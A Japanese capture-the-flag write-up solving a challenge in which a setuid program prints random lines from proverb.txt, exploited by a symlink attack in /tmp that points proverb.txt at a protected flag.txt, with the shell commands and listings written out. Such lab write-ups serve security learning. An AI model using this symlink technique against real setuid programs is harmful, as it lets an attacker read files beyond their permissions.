自力解答ならず。  

```bash
$ ssh q13@ctfq.u1tramarine.blue -p 10013
q13@ctfq.u1tramarine.blue's password:
This server will destruct in 10 minutes.
Keep your progress by yourself.
```

```bash
$ ls -alF
total 52
dr-xr-xr-x 1 root root  4096 Feb 25  2021 ./
drwxr-xr-x 1 root root  4096 Feb 25  2021 ../
-rw-r--r-- 1 q13  q13     18 Jul 21  2020 .bash_logout
-rw-r--r-- 1 q13  q13    141 Jul 21  2020 .bash_profile
-rw-r--r-- 1 q13  q13    543 Feb 25  2021 .bashrc
-r-------- 1 q13a q13a    22 Feb 25  2021 flag.txt
---s--x--x 1 q13a q13a 24144 Feb 25  2021 proverb*
-r--r--r-- 1 q13a q13a   755 Feb 25  2021 proverb.txt
```

```bash
$ cat proverb.txt
All's well that ends well.
A good beginning makes a good ending.
Many a true word is spoken in jest.
Fear is often greater than the danger.
Go for broke!
Fire is a good servant but a bad master.
The wolf knows what the ill beast thinks.
There is always a next time.
Spare the rod and spoil the child.
The calm before the storm.
The die is cast.
Take heed of the snake in the grass.
Confidence is a plant of slow growth.
Love is blind.
The sky's the limit...
Truth lies at the bottom of a well.
Blood is thicker than water.
Ignorance is bliss.
There's no way out.
Full of courtesy, full of craft.
Heaven helps those who help themselves.
Bad luck often brings good luck.
Misfortunes never come singly.
Nothing ventured, nothing gained.
Eternal Immortality.
```

実行ファイルの``proverb``は``proverb.txt``の中身をランダムに一行分だけ表示するプログラムのようだ。  

で、どないすりゃええねん。  

### 正解

Symlink Attack（シンボリックリンク攻撃）を行う。  
リンク先に対する権限がなくてもシンボリックリンクは作成可能なのを利用した攻撃手法（はじめて知った）。  

``proverb``は所有者（``q13a``）の実行権限が``s``となっている。  

```bash
$ ls -alF
total 52
dr-xr-xr-x 1 root root  4096 Feb 25  2021 ./
drwxr-xr-x 1 root root  4096 Feb 25  2021 ../
-rw-r--r-- 1 q13  q13     18 Jul 21  2020 .bash_logout
-rw-r--r-- 1 q13  q13    141 Jul 21  2020 .bash_profile
-rw-r--r-- 1 q13  q13    543 Feb 25  2021 .bashrc
-r-------- 1 q13a q13a    22 Feb 25  2021 flag.txt
---s--x--x 1 q13a q13a 24144 Feb 25  2021 proverb*
-r--r--r-- 1 q13a q13a   755 Feb 25  2021 proverb.txt
```

これは他のユーザが実行した場合、``q13a``の権限で実行されることになる。  
もし``q13a``にしか閲覧権限のない``flag.txt``の名前を``proverb.txt``に変更することができたとしたら、``proverb``を介して``flag.txt``の中身を閲覧できることを示唆する。  

``q13``はホームディレクトリのくせに書き込み権限がないので、シンボリックリンク攻撃によく使用される``/tmp``を見てみる。  

```bash
$ ls -alF /
total 64
drwxr-xr-x   1 root root 4096 May  7 03:50 ./
drwxr-xr-x   1 root root 4096 May  7 03:50 ../
-rwxr-xr-x   1 root root    0 May  7 03:50 .dockerenv*
lrwxrwxrwx   1 root root    7 Nov  3  2020 bin -> usr/bin/
drwxr-xr-x   5 root root  340 May  7 03:50 dev/
drwxr-xr-x   1 root root 4096 May  7 03:50 etc/
drwxr-xr-x   1 root root 4096 Feb 25  2021 home/
lrwxrwxrwx   1 root root    7 Nov  3  2020 lib -> usr/lib/
lrwxrwxrwx   1 root root    9 Nov  3  2020 lib64 -> usr/lib64/
drwx------   2 root root 4096 Dec  4  2020 lost+found/
drwxr-xr-x   2 root root 4096 Nov  3  2020 media/
drwxr-xr-x   2 root root 4096 Nov  3  2020 mnt/
drwxr-xr-x   2 root root 4096 Nov  3  2020 opt/
dr-xr-xr-x 253 root root    0 May  7 03:50 proc/
dr-xr-x---   2 root root 4096 Dec  4  2020 root/
drwxr-xr-x   1 root root 4096 May  7 03:50 run/
lrwxrwxrwx   1 root root    8 Nov  3  2020 sbin -> usr/sbin/
drwxr-xr-x   2 root root 4096 Nov  3  2020 srv/
dr-xr-xr-x  13 root root    0 Mar  7 20:24 sys/
drwxrwxrwt   1 root root 4096 May  7 03:55 tmp/
drwxr-xr-x   1 root root 4096 Dec  4  2020 usr/
drwxr-xr-x   1 root root 4096 Dec  4  2020 var/
```

所有者はもちろん``root``だが他ユーザでも``/tmp``の中でファイルを生成可能。  
シンボリックリンク攻撃をしかけるには当該ディレクトリが実行ユーザの所有物である必要があるので、``/tmp``直下にサブディレクトリを作成し、その中でシンボリックリンクを張る。  

```bash
$ cd /tmp/
$ mkdir hoge
$ ls -alF /tmp/
total 40
drwxrwxrwt 1 root root 4096 May  7 03:55 ./
drwxr-xr-x 1 root root 4096 May  7 03:50 ../
drwxrwxrwt 2 root root 4096 Dec  4  2020 .ICE-unix/
drwxrwxrwt 2 root root 4096 Dec  4  2020 .Test-unix/
drwxrwxrwt 2 root root 4096 Dec  4  2020 .X11-unix/
drwxrwxrwt 2 root root 4096 Dec  4  2020 .XIM-unix/
drwxrwxrwt 2 root root 4096 Dec  4  2020 .font-unix/
drwxrwxr-x 2 q13  q13  4096 May  7 03:55 hoge/
-rwx------ 1 root root  701 Dec  4  2020 ks-script-esd4my7v*
-rwx------ 1 root root  671 Dec  4  2020 ks-script-eusq_sc5*
$ cd /tmp/hoge
$ ln -s /home/q13/flag.txt proverb.txt
$ ls -alF
total 8
drwxrwxr-x 2 q13  q13  4096 May  7 04:03 ./
drwxrwxrwt 1 root root 4096 May  7 04:01 ../
lrwxrwxrwx 1 q13  q13    18 May  7 04:03 proverb.txt -> /home/q13/flag.txt
```

これで``proverb``はカレントディレクトリの``proverb.txt（実態は /home/q13/flag.txt）``を読み込むことになり、中身を表示する。  
``/tmp/hoge/``にいるので絶対パス形式で実行。  

```bash
$ /home/q13/proverb
```

### 参考

- [シンボリックリンクの悪用 | IPA](https://www.ipa.go.jp/security/awareness/vendor/programmingv1/b07_01.html)
